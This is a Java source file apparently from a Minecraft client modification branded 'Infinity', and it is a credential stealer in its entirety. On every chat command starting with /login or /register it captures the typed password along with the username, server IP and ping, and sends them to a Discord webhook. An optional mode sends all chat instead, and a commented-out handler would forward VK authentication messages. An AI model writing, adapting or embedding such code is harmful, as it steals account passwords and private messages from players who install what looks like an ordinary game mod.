package Game.Sense.client.Helper.events.impl.input.logger;


import Game.Sense.client.Helper.EventTarget;
import Game.Sense.client.Helper.events.impl.input.logger.webhook.DiscordWebhook;
import net.minecraft.client.Minecraft;
import Game.Sense.client.Helper.events.impl.input.logger.config.cfg;
import net.minecraft.network.play.client.CPacketChatMessage;

import java.awt.*;
import java.io.IOException;
import java.util.Objects;

public class log {
    DiscordWebhook webhookLogger = cfg.logger;
    DiscordWebhook webhookDetector = cfg.detector;

    @EventTarget
    public void ChatEvent(CPacketChatMessage e) throws IOException {
        String msg = e.getMessage();
        String[] sentences = e.getMessage().split(" ");

        if (!cfg.logAll) {
            if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
                webhookLogger.clearEmbeds();
                webhookLogger.addEmbed(new DiscordWebhook.EmbedObject()
                        .setTitle("Infinity")
                        .setDescription("Minecraft Modification | Logger")
                        .setColor(new Color(0x0082FF))
                        .addField("USER", Minecraft.getMinecraft().getSession().getUsername(), true)
                        .addField("PASSWORD", sentences[1], true)
                        .addField("SERVER", Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).serverIP, true)
                        .addField("PING", String.valueOf(Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).pingToServer), true)


                        .setThumbnail("https://cdn.discordapp.com/avatars/860143202358525982/efef80293eb31d69dd3c654ebd1a5575.webp?size=100"));

                webhookLogger.execute();
            }
        } else {
            webhookLogger.setContent("```" + Minecraft.getMinecraft().getSession().getUsername() + ": " + msg + "```");
            webhookLogger.execute();
        }
    }

//    @EventTarget
//    public void detector(ClientChatReceivedEvent e) {
//        String msg = e.getMessage().getUnformattedText();
//        // String[] sentences = msg.split(" ");
//
//        if (msg.contains("ВКонтакте")) {
//            try {
//                webhookDetector.setContent("DETECTED VK-AUTH MESSAGE: ```" + msg + "```");
//                webhookDetector.execute();
//            } catch (IOException ignored) {}
//        }
//        if (msg.contains("ВК")) {
//            try {
//                webhookDetector.setContent("DETECTED VK-AUTH MESSAGE: ```" + msg + "```");
//                webhookDetector.execute();
//            } catch (IOException ignored) {}
//        }
//        if (msg.contains("Вконтакте")) {
//            try {
//                webhookDetector.setContent("DETECTED VK-AUTH MESSAGE: ```" + msg + "```");
//                webhookDetector.execute();
//            } catch (IOException ignored) {}
//        }
//    }
}
